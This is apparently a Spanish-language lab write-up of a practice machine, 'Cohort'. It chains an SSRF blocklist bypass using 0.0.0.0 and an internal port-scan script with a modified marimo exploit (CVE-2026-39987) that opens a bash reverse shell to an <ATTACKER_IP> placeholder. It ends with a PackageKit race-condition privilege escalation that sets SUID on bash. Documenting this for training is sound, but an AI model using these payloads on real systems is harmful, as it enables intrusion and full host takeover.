Una API de validación de URLs es vulnerable a SSRF: bloquea `127.0.0.1` pero acepta `0.0.0.0`, lo suficiente para escanear puertos internos y leer un endpoint `/status` que da 403 desde fuera. Esa página de estado filtra un subdominio interno de notebook que corre **marimo 0.20.4**, que expone un WebSocket de terminal sin autenticar — **CVE-2026-39987** — para un foothold como `marimo`. Una build vulnerable de **PackageKit** cae después ante una carrera TOCTOU (**CVE-2026-41651**) que instala un paquete propiedad de root que activa el SUID en `bash`, dando root.

## Reconocimiento y Enumeración

El objetivo de esta fase fue enumerar los servicios expuestos e identificar el punto de entrada.

### Descubrimiento del Host

Una única sonda ICMP confirmó el alcance y dio una pista del SO:

```bash
ping -c 1 10.129.107.34
PING 10.129.107.34 (10.129.107.34) 56(84) bytes of data.
64 bytes from 10.129.107.34: icmp_seq=1 ttl=63 time=42.3 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al atravesar el salto de enrutamiento de la VPN).

Tres conclusiones. El SSH es un OpenSSH actual sobre Ubuntu — ningún punto de entrada directo. Tanto HTTP como HTTPS redirigen a `https://cohort.htb/`, lo que es virtual hosting basado en nombre, así que el dominio se añadió a `/etc/hosts`:

Y el certificado TLS lleva un **SAN con wildcard** — `DNS:*.cohort.htb`. Esa única línea pre-revela que el operador espera usar subdominios; encontrarlos pasa a ser prioridad más adelante.

## Explotación

### SSRF — `/api/validate` y el bypass con `0.0.0.0`

Sondeando la superficie de la API apareció `/api/validate`, un endpoint que descarga del lado del servidor una URL suministrada por el usuario (para "validar" una fuente de datos) y devuelve una previsualización de la respuesta. Cualquier endpoint que descargue una URL controlada por el atacante es candidato a Server-Side Request Forgery. Los desarrolladores claramente lo anticiparon y añadieron una blocklist para direcciones internas/loopback:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1","format":"csv"}' -k
{"ok": false, "message": "Internal or loopback addresses are not permitted."}
```

La blocklist rechaza `127.0.0.1`, pero las blocklists que enumeran "loopback" por cadena literal son notoriamente incompletas. `0.0.0.0` es la dirección no especificada; para una conexión **saliente** en Linux resuelve al propio host, y sin embargo no casa con un filtro ingenuo de `127.0.0.1`/`localhost`. Pasó de largo:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"https://0.0.0.0","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n[...]<title>Cohort Analytics</title>[...]", "message": "Source reachable."}
```

El servidor descargó su propia página de inicio en nombre de la petición — SSRF confirmada. Una sonda más fijó el filtro de esquemas:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"file://0.0.0.0","format":"csv"}' -k
{"ok": false, "message": "Only http and https sources are supported."}
```

`file://` está bloqueado, así que no hay lectura de ficheros locales — pero la descarga HTTP(S) interna arbitraria está abierta de par en par.

#### Mapeando la superficie de ataque interna

Con `0.0.0.0` alcanzando localhost, el SSRF se convierte en un escáner de puertos interno. Los puertos inalcanzables vuelven con un mensaje `Could not reach the source:`, así que un pequeño script que dispara los puertos más comunes a través de la API y filtra por la ausencia de esa cadena enumera qué está escuchando internamente:

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

main_url = "https://cohort.htb/api/validate"
ports = [
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 111, 995, 993, 5900, 1025, 587, 8888, 199, 1720, 465, 548, 113, 81, 6001,
    10000, 514, 5060, 179, 1026, 2000, 8443, 8000, 32768, 554, 26, 1433, 49152, 5432, 9100, 1027, 1024, 1029, 1028, 5000
]

def main():
    for port in ports:
        post_data = {'url': f"http://0.0.0.0:{port}", 'format': 'csv'}
        res = requests.post(main_url, json=post_data, verify=False)
        if not "Could not reach the source:" in res.text:
            print(f"Port {port} is open")

if __name__ == '__main__':
    main()
```

```bash

Port 443 is open
Port 22 is open
Port 8888 is open
Port 5000 is open
```

Dos servicios solo-internos aparecen por encima de los puertos públicos: **8888** y **5000**. Descargando el `8888` a través del SSRF se obtuvo una página de login cuyo título lo delata — un notebook **marimo**:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0:8888","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "[...]<title>marimo</title>[...]<label for=\"password\">Access Token / Password</label>[...]", "message": "Source reachable."}
```

marimo expone su versión sin autenticar, y el SSRF la lee sin problema:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0:8888/api/version","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "text/plain; charset=utf-8", "preview": "0.20.4", "message": "Source reachable."}
```

**marimo 0.20.4**. Esa versión es la pista — pero el notebook está detrás de un login y, como mostrarán los datos de upstream de `/status`, detrás de un vhost concreto. Lo que vuelve a poner en juego el 403 del gobuster.

#### Encadenando el SSRF hacia el endpoint 403 `/status`

`/status` daba 403 desde fuera porque nginx solo lo permite desde localhost. La petición del SSRF *se origina* en localhost, así que descargar `/status` a través de él evita la restricción por completo:

```bash
curl -X POST https://cohort.htb/api/validate -H 'Content-Type: application/json' -d '{"url":"http://0.0.0.0/status","format":"csv"}' -k
{"ok": true, "fetched_status": 200, "content_type": "application/json",
 "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",
  \"upstreams\":[
    {\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},
    {\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},
    {\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",
     \"note\":\"internal analyst workspace, not for external use\"}]}"}
```

La página de estado es un mapa de upstreams de nginx, y entrega la pieza que faltaba: el notebook marimo (puerto 8888) se sirve en el vhost **`nb-1be3782a8afd3ad5.cohort.htb`**. El subdominio de aspecto aleatorio actuaba como seguridad por oscuridad — imposible de adivinar con un diccionario, pero el SAN con wildcard ya nos decía que existían subdominios, y el SSRF acaba de entregarnos el nombre exacto. Fue al `/etc/hosts`:

```bash
echo "10.129.107.34 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

Con la cabecera `Host` correcta, nginx ahora enruta directamente al notebook marimo y se renderiza en el navegador — sin necesidad de SSRF a partir de aquí.

### CVE-2026-39987 — RCE en el Terminal de marimo sin Autenticar

marimo 0.20.4 es vulnerable a **CVE-2026-39987**. Los notebooks de marimo exponen una funcionalidad de terminal sobre un WebSocket en `/terminal/ws`, y en la versión afectada ese socket es accesible **sin autenticación** — a pesar de la barrera de login "Access Token / Password" del front end HTTP. Cualquier cosa que se escriba en el socket se ejecuta como comando de shell en el servidor, así que un cliente que abra el WebSocket y envíe una línea de comando obtiene ejecución de comandos arbitraria como la cuenta de servicio del notebook.

Basé el exploit en el PoC público (`github.com/fevar54/marimo_CVE-2026-39987_RCE_PoC` / `rootdirective-sec/CVE-2026-39987-Lab`) y lo modifiqué — la comprobación original solo demostraba la ejecución con `id`, así que cambié el comando por una reverse shell y mantuve el socket abierto después para que la shell sobreviviera:

```python
#!/usr/bin/env python3
import argparse
import re
import sys
import time
import urllib3
import ssl
from urllib.parse import urlparse

import websocket

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def to_ws_url(base_url: str) -> str:
    parsed = urlparse(base_url)
    if parsed.scheme not in {"http", "https"}:
        raise ValueError("base-url must start with http:// or https://")
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    netloc = parsed.netloc
    return f"{ws_scheme}://{netloc}/terminal/ws"


def recv_for(ws, seconds: float = 3.0) -> str:
    end = time.time() + seconds
    chunks = []
    while time.time() < end:
        try:
            chunk = ws.recv()
            if chunk:
                if isinstance(chunk, bytes):
                    chunk = chunk.decode("utf-8", errors="replace")
                chunks.append(chunk)
        except websocket.WebSocketTimeoutException:
            continue
        except Exception:
            break
    return "".join(chunks)


def clean_terminal_output(raw: str, marker_start: str, marker_end: str) -> str:
    # Remove common ANSI escape sequences from PTY output.
    raw = re.sub(r"\x1b\[[0-9;?]*[A-Za-z]", "", raw)
    raw = raw.replace("\r", "")
    if marker_start in raw and marker_end in raw:
        body = raw.split(marker_start, 1)[1].split(marker_end, 1)[0]
    else:
        body = raw
    lines = []
    for line in body.splitlines():
        line = line.strip()
        if not line:
            continue
        if marker_start in line or marker_end in line:
            continue
        if "printf" in line and "whoami" in line:
            continue
        if line.startswith("$"):
            continue
        lines.append(line)
    return "\n".join(lines).strip()


def main() -> int:
    parser = argparse.ArgumentParser(description="Least-harm local PoC for CVE-2026-39987.")
    parser.add_argument("--base-url", required=True,
                        help="Local marimo base URL, e.g. http://127.0.0.1:8081")
    args = parser.parse_args()

    try:
        ws_url = to_ws_url(args.base_url)
    except ValueError as e:
        print(f"[safety] {e}")
        return 2

    marker_start = "CVE39987_PROOF_START"
    marker_end = "CVE39987_PROOF_END"

    command = (
        "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'; "
        "id; "
        "whoami; "
        )

    print(f"[*] Target WebSocket: {ws_url}")
    print("[*] Sending benign proof command only: id; whoami; hostname")

    try:
        ws = websocket.create_connection(ws_url, timeout=4,
                                         sslopt={"cert_reqs": ssl.CERT_NONE, "check_hostname": False})
    except Exception as e:
        print(f"[-] websocket connection rejected/failed: {e}")
        print("[result] not exploitable by this unauthenticated check")
        return 0

    print("[+] websocket connected without credentials")

    try:
        ws.settimeout(0.3)
        recv_for(ws, 1.0)               # drain greeting / prompt noise
        ws.send(command + "\n")         # send the command as a terminal line
        raw = recv_for(ws, 4.0)
        proof = clean_terminal_output(raw, marker_start, marker_end)
        if "uid=" in proof:
            print("[result] VULNERABLE: unauthenticated command execution observed")
            print("[proof]")
            print(proof)
            return 0
        print("[result] websocket connected, but command proof was not captured cleanly")
        print("[raw-output]")
        print(raw)
        return 0
    finally:
        try:
            time.sleep(3600)            # keep the socket open so the reverse shell survives
            ws.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
```

Los dos cambios que importan están en `command` — la primera entrada es la reverse shell de Bash en lugar de un `id` inocuo — y el `time.sleep(3600)` en el bloque `finally`, que mantiene el WebSocket (y por tanto la shell hija) abierto en vez de cerrarlo de inmediato. Apuntándolo al vhost del notebook:

```bash
python3 poc.py --base-url https://nb-1be3782a8afd3ad5.cohort.htb/
[*] Target WebSocket: wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws
[+] websocket connected without credentials
[result] websocket connected, but command proof was not captured cleanly
```

La lógica de captura de la prueba no pudo parsear la salida del PTY limpiamente (la reverse shell se dispara antes de que vuelva el echo de `id`/`whoami`), pero eso es cosmético — el socket conectó sin autenticar y la reverse shell ya se había ejecutado.

## Foothold — `marimo`

El listener de netcat recibió el callback:

```bash
nc -nlvp 4444
[...]
marimo@cohort:~$ cat user.txt

```

Un upgrade estándar de TTY (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) dejó la shell utilizable. `/etc/passwd` muestra lo blindada que está la máquina — la cuenta del notebook es `nologin` y solo `root` lleva una shell interactiva:

```bash
marimo@cohort:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[...]
_laurel:x:999:988::/var/log/laurel:/bin/false
insights:x:996:987::/home/insights:/usr/sbin/nologin
marimo:x:1000:1000::/home/marimo:/usr/sbin/nologin
```

La presencia de `_laurel` (un procesador de logs de auditd) es una pequeña señal de que esta máquina audita de forma agresiva — conviene mantener los payloads limpios, pero no es un obstáculo. Sin un objetivo lateral evidente, el camino a root pasa por una escalada de privilegios local.

## Escalada de Privilegios — `marimo` → `root`

`sudo -l` no estaba disponible, no había binarios SUID inusuales, y no apareció ninguna credencial legible. La pista vino de enumerar los paquetes instalados — uno de ellos está retenido en una versión concreta y conocida por ser vulnerable:

```bash
marimo@cohort:/$ dpkg -l | grep "packagekit"
ii  gir1.2-packagekitglib-1.0   1.2.8-2ubuntu1.5   amd64   GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18      1.2.8-2ubuntu1.5   amd64   Library for accessing PackageKit using GLib
hi  packagekit                  1.2.8-2ubuntu1.2   amd64   Provides a package management service
ii  packagekit-tools            1.2.8-2ubuntu1.2   amd64   Provides PackageKit command-line tools
```

El estado `hi` en `packagekit` significa que el paquete está en **hold** en `1.2.8-2ubuntu1.2` — fijado una revisión por detrás del `1.2.8-2ubuntu1.5` al que se actualizaron sus librerías GLib. Ese downgrade-y-hold deliberado es el vector previsto: esta build de PackageKit es vulnerable a **CVE-2026-41651**, una escalada de privilegios local por TOCTOU (time-of-check-to-time-of-use).

El servicio D-Bus de PackageKit corre como root y expone un método `InstallFiles`. El exploit (PoC público en `github.com/Vozec/CVE-2026-41651`) construye dos paquetes `.deb` — un `dummy` inofensivo y un `payload` cuyo maintainer script activa el SUID en `bash` — y luego lanza dos llamadas a `InstallFiles` seguidas: la primera con el flag `SIMULATE` (que pasa la comprobación de autorización más ligera) y la segunda sin flag. La carrera está entre PackageKit validando la transacción y actuando realmente sobre los ficheros: en la versión afectada la ventana deja que la instalación real (no simulada) del payload del atacante se cuele aunque el prompt de polkit acabe siendo denegado, de modo que el maintainer script del payload corre como root.

Me transferí el exploit compilado desde un listener en mi máquina:

```bash

marimo@cohort:~$ chmod +x exploit
```

Ejecutándolo se gana la carrera y suelta un `bash` SUID:

## Puntos Clave

- **Las blocklists de SSRF que enumeran "localhost" por cadena son triviales de evadir.** Bloquear `127.0.0.1` olvidando `0.0.0.0` (y `[::1]`, `127.0.0.2`, codificaciones decimales/hex, DNS rebinding, redirecciones) es la norma, no la excepción. `0.0.0.0` alcanzó la interfaz de loopback y convirtió una funcionalidad de "validación" en un escáner interno y en un bypass de un endpoint con control de acceso.

- **Un SSRF está tan contenido como la red interna que puede ver.** La misma primitiva hizo tres trabajos aquí: escaneó puertos en localhost, hizo fingerprinting de un servicio interno, y derrotó el 403 basado en IP de nginx sobre `/status` — porque la petición se originaba en localhost. El allow-listing por IP no sustituye a la autenticación cuando un SSRF puede tomar prestado el propio origen del servidor.

- **Los certificados TLS con wildcard pre-revelan que existen subdominios.** `*.cohort.htb` no reveló el nombre aleatorio `nb-1be3782a8afd3ad5`, pero confirmó que la búsqueda merecía la pena; el mapa de upstreams de `/status` filtrado por el SSRF entregó después el vhost exacto. Un subdominio de alta entropía es oscuridad, no control de acceso.

- **La autenticación en la puerta principal no vale nada si una puerta lateral no está autenticada.** marimo protegió su UI HTTP tras un token de acceso pero dejó abierto el WebSocket `/terminal/ws` (CVE-2026-39987). Hay que enumerar siempre todos los protocolos que habla un servicio — el terminal por WebSocket era la máquina entera.

- **Un paquete en `hold` una revisión por detrás es una miga de pan deliberada.** El flag `hi` en `dpkg -l` sobre `packagekit` era la señal más clara posible de un CVE previsto; comprobar las versiones exactas de servicios privilegiados que corren como root (el daemon D-Bus de PackageKit) es donde la enumeración de privesc local rinde.

- **Las carreras TOCTOU derrotan las comprobaciones de autorización que no son atómicas con la acción que protegen.** CVE-2026-41651 explotó el hueco entre PackageKit validando una transacción y realizando la instalación; el prompt de polkit se denegó, y sin embargo el payload aterrizó primero. Cuando una operación privilegiada comprueba y luego actúa en dos pasos, la comprobación es meramente informativa salvo que ambas sean atómicas.
